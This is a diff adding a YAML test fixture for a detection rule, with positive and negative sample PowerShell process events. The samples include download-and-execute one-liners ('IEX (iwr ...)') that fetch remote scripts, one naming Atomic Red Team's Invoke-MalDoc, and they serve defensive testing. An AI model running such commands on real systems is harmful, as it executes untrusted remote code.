@@ -1,0 +1,30 @@
+id: 27b56c7b-ad80-4099-8416-bdb353facd67
+positive:
+- name: IEX iwr raw.githubusercontent.com with Invoke-MalDoc
+  event: &ev
+    event.code: "1"
+    process.name: powershell.exe
+    process.executable: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    process.command_line: |-
+      powershell.exe -c "IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing); Invoke-MalDoc"
+- name: IEX iwr raw.githubusercontent.com that mentions Word
+  event:
+    <<: *ev
+    process.command_line: |-
+      powershell.exe -c "IEX (iwr https://raw.githubusercontent.com/x/y/z.ps1); Start-Process Word"
+negative:
+- name: download without IEX
+  event:
+    <<: *ev
+    process.command_line: |-
+      powershell.exe -c "iwr https://raw.githubusercontent.com/x/y/z.ps1 -OutFile a.ps1; Word"
+- name: IEX iwr from another host
+  event:
+    <<: *ev
+    process.command_line: |-
+      powershell.exe -c "IEX (iwr https://example.com/a.ps1); Invoke-MalDoc"
+- name: IEX iwr raw.githubusercontent.com with no maldoc or Office marker
+  event:
+    <<: *ev
+    process.command_line: |-
+      powershell.exe -c "IEX (iwr https://raw.githubusercontent.com/x/y/z.ps1)"
